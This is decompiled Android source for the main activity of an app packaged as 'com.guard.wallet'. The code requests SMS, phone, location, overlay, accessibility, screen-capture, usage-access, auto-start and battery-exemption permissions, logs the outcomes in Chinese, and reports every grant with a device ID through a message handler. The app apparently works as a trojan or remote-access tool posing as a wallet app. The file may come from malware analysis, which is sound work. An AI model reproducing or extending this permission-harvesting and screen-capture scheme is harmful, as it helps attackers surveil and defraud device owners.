package com.guard.wallet.activity;

import a1.AbstractC0026q;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.view.PointerIconCompat;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.Toast;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.PermissionResponseVO;
import com.guard.wallet.service.MediaLiveService;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0246b;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import e0.C0267e;
import java.lang.ref.WeakReference;
import java.util.Objects;
import p020x.C0967a;

/* loaded from: classes.dex */
public class MainActivity extends Activity {

    /* renamed from: a */
    public WeakReference f188a;

    /* renamed from: b */
    public Long f189b;

    @Override // android.app.Activity
    public final void onActivityResult(int i2, int i3, Intent intent) {
        String str;
        String str2;
        switch (i2) {
            case PointerIconCompat.TYPE_HAND /* 1002 */:
                if (i3 != -1) {
                    str = "安装应用程序申请失败";
                    Log.e("MainActivity", str);
                    break;
                } else {
                    str2 = "安装应用程序申请成功";
                    Log.d("MainActivity", str2);
                    break;
                }
            case PointerIconCompat.TYPE_HELP /* 1003 */:
                if (Build.VERSION.SDK_INT < 29) {
                    C0967a.m1462b().m1467g(intent);
                    break;
                } else {
                    Intent intent2 = new Intent(this, (Class<?>) MediaLiveService.class);
                    intent2.putExtra("code", i3);
                    intent2.putExtra("data", intent);
                    startForegroundService(intent2);
                    break;
                }
            case PointerIconCompat.TYPE_WAIT /* 1004 */:
                if (i3 != -1) {
                    str = "悬浮窗权限申请失败";
                    Log.e("MainActivity", str);
                    break;
                } else {
                    str2 = "悬浮窗权限申请成功";
                    Log.d("MainActivity", str2);
                    break;
                }
            case 1005:
            case PointerIconCompat.TYPE_CROSSHAIR /* 1007 */:
            case PointerIconCompat.TYPE_TEXT /* 1008 */:
            case PointerIconCompat.TYPE_COPY /* 1011 */:
            case PointerIconCompat.TYPE_NO_DROP /* 1012 */:
            case PointerIconCompat.TYPE_HORIZONTAL_DOUBLE_ARROW /* 1014 */:
            default:
                super.onActivityResult(i2, i3, intent);
                break;
            case PointerIconCompat.TYPE_CELL /* 1006 */:
                if (i3 != -1) {
                    str = "使用情况访问权限申请失败";
                    Log.e("MainActivity", str);
                    break;
                } else {
                    str2 = "使用情况访问权限申请成功";
                    Log.d("MainActivity", str2);
                    break;
                }
            case PointerIconCompat.TYPE_VERTICAL_TEXT /* 1009 */:
                if (i3 != -1) {
                    str = "自启动权限申请失败";
                    Log.e("MainActivity", str);
                    break;
                } else {
                    str2 = "自启动权限申请成功";
                    Log.d("MainActivity", str2);
                    break;
                }
            case PointerIconCompat.TYPE_ALIAS /* 1010 */:
                if (i3 != -1) {
                    str = "电量优化白名单权限申请失败";
                    Log.e("MainActivity", str);
                    break;
                } else {
                    str2 = "电量优化白名单权限申请成功";
                    Log.d("MainActivity", str2);
                    break;
                }
            case PointerIconCompat.TYPE_ALL_SCROLL /* 1013 */:
                if (i3 != -1) {
                    str = "REQUEST_PERMISSION_BY_CODE 申请失败";
                    Log.e("MainActivity", str);
                    break;
                } else {
                    str2 = "REQUEST_PERMISSION_BY_CODE 申请成功";
                    Log.d("MainActivity", str2);
                    break;
                }
            case PointerIconCompat.TYPE_VERTICAL_DOUBLE_ARROW /* 1015 */:
                if (i3 != -1) {
                    str = "设备读写权限申请失败";
                    Log.e("MainActivity", str);
                    break;
                } else {
                    str2 = "设备读写权限申请成功";
                    Log.d("MainActivity", str2);
                    break;
                }
            case PointerIconCompat.TYPE_TOP_RIGHT_DIAGONAL_DOUBLE_ARROW /* 1016 */:
                if (i3 != -1) {
                    str = "设备系统项修改权限申请失败";
                    Log.e("MainActivity", str);
                    break;
                } else {
                    str2 = "设备系统项修改权限申请成功";
                    Log.d("MainActivity", str2);
                    break;
                }
        }
        PermissionResponseVO permissionResponseVO = new PermissionResponseVO();
        permissionResponseVO.setDeviceId(AbstractC0252h.m708l("deviceId"));
        permissionResponseVO.setRequestCode(Integer.valueOf(i2));
        permissionResponseVO.setRequested(1);
        permissionResponseVO.setGranted(Integer.valueOf(i3 != -1 ? 0 : 1));
        MessageRecordVO messageRecordVO = new MessageRecordVO();
        messageRecordVO.setExtraBody(permissionResponseVO);
        messageRecordVO.setIntentCode("android.intent.action.GRANT");
        MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
        getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
        C0267e c0267e = new C0267e(getApplicationContext(), false);
        LinearLayout linearLayout = new LinearLayout(this);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
        layoutParams.width = -1;
        layoutParams.height = -1;
        linearLayout.setBackgroundColor(Color.parseColor("#303133"));
        setContentView(linearLayout, layoutParams);
        this.f188a = new WeakReference(c0267e);
        WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams();
        layoutParams2.width = -1;
        layoutParams2.height = -1;
        linearLayout.addView((View) this.f188a.get(), layoutParams2);
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.type = 2038;
        getWindow().setAttributes(attributes);
        this.f189b = Long.valueOf(System.currentTimeMillis());
        AbstractC0246b.m599d(this);
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        WeakReference weakReference = this.f188a;
        if (weakReference != null && weakReference.get() != null) {
            ((C0267e) this.f188a.get()).destroy();
            this.f188a = null;
        }
        super.onDestroy();
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onDetachedFromWindow() {
        super.onDetachedFromWindow();
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public final boolean onKeyDown(int i2, KeyEvent keyEvent) {
        if (i2 != 4 || keyEvent.getAction() != 0) {
            return super.onKeyDown(i2, keyEvent);
        }
        WeakReference weakReference = this.f188a;
        if (weakReference != null && weakReference.get() != null) {
            if (((C0267e) this.f188a.get()).f442a.get()) {
                return false;
            }
            if (((C0267e) this.f188a.get()).canGoBack()) {
                ((C0267e) this.f188a.get()).goBack();
                return true;
            }
        }
        if (System.currentTimeMillis() - this.f189b.longValue() > 2000) {
            this.f189b = Long.valueOf(System.currentTimeMillis());
            Integer num = AbstractC0248d.f402a;
            Toast.makeText(this, (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getExitConfirm())) ? "Press again to exit" : MainApplication.getInstance().getBuildConfig().getExitConfirm(), 0).show();
        } else {
            finish();
        }
        return true;
    }

    @Override // android.app.Activity
    public final void onPause() {
        super.onPause();
        WeakReference weakReference = this.f188a;
        if (weakReference == null || weakReference.get() == null) {
            return;
        }
        ((C0267e) this.f188a.get()).onPause();
    }

    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i2, String[] strArr, int[] iArr) {
        String str;
        String str2;
        if (i2 != 1001) {
            if (i2 != 1007) {
                if (i2 != 1008) {
                    switch (i2) {
                        case PointerIconCompat.TYPE_COPY /* 1011 */:
                            if (iArr.length > 0 && iArr[0] == 0) {
                                str2 = "短信权限申请成功";
                                break;
                            } else {
                                str2 = "短信权限申请失败";
                                break;
                            }
                        case PointerIconCompat.TYPE_NO_DROP /* 1012 */:
                            if (iArr.length > 0 && iArr[0] == 0) {
                                str2 = "电话权限申请成功";
                                break;
                            } else {
                                str2 = "电话权限申请失败";
                                break;
                            }
                            break;
                        case PointerIconCompat.TYPE_ALL_SCROLL /* 1013 */:
                            if (iArr.length > 0 && iArr[0] == 0) {
                                str2 = "REQUEST_PERMISSION_BY_CODE 申请成功";
                                break;
                            } else {
                                str = "REQUEST_PERMISSION_BY_CODE 申请失败";
                                Log.e("MainActivity", str);
                                break;
                            }
                            break;
                        case PointerIconCompat.TYPE_HORIZONTAL_DOUBLE_ARROW /* 1014 */:
                            if (iArr.length > 0 && iArr[0] == 0) {
                                str2 = "通知权限申请成功";
                                break;
                            } else {
                                str = "通知权限申请失败";
                                Log.e("MainActivity", str);
                                break;
                            }
                            break;
                        default:
                            super.onRequestPermissionsResult(i2, strArr, iArr);
                            break;
                    }
                } else {
                    str2 = (iArr.length <= 0 || iArr[0] != 0) ? "后台位置信息权限申请失败" : "后台位置信息权限申请成功";
                }
                Log.d("MainActivity", str2);
            } else if (iArr.length <= 0 || iArr[0] != 0) {
                str = "前台位置信息权限申请失败";
                Log.e("MainActivity", str);
            } else {
                str2 = "前台位置信息权限申请成功";
                Log.d("MainActivity", str2);
            }
        } else if (iArr.length <= 0 || iArr[0] != 0) {
            str = "设备读写权限申请失败";
            Log.e("MainActivity", str);
        } else {
            str2 = "设备读写权限申请成功";
            Log.d("MainActivity", str2);
        }
        PermissionResponseVO permissionResponseVO = new PermissionResponseVO();
        permissionResponseVO.setDeviceId(AbstractC0252h.m708l("deviceId"));
        permissionResponseVO.setRequestCode(Integer.valueOf(i2));
        permissionResponseVO.setRequested(1);
        permissionResponseVO.setGranted((iArr.length <= 0 || iArr[0] != 0) ? 0 : 1);
        MessageRecordVO messageRecordVO = new MessageRecordVO();
        messageRecordVO.setExtraBody(permissionResponseVO);
        messageRecordVO.setIntentCode("android.intent.action.GRANT");
        MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
    }

    @Override // android.app.Activity
    public final void onResume() {
        boolean m701e;
        super.onResume();
        WeakReference weakReference = this.f188a;
        if (weakReference == null || weakReference.get() == null) {
            return;
        }
        ((C0267e) this.f188a.get()).onResume();
        if (MyAccessibilityService.m554P() == null && !AbstractC0251g.m663j()) {
            synchronized (AbstractC0252h.class) {
                m701e = AbstractC0252h.m701e("adbCanWriteSecure");
            }
            if (!m701e) {
                ((C0267e) this.f188a.get()).loadUrl(AbstractC0246b.m598c());
                ((C0267e) this.f188a.get()).setGuide(true);
                AbstractC0246b.m601f();
                return;
            }
        }
        if (((C0267e) this.f188a.get()).getPageFinished() && ((C0267e) this.f188a.get()).getUrl() != null) {
            String url = ((C0267e) this.f188a.get()).getUrl();
            Objects.requireNonNull(url);
            if (url.startsWith(AbstractC0248d.m608f())) {
                Log.d("MainActivity", "Main url is load finished");
                AbstractC0246b.m597b();
            }
        }
        ((C0267e) this.f188a.get()).loadUrl(AbstractC0248d.m608f());
        ((C0267e) this.f188a.get()).setGuide(false);
        AbstractC0246b.m597b();
    }

    @Override // android.app.Activity
    public final void onStart() {
        super.onStart();
    }
}
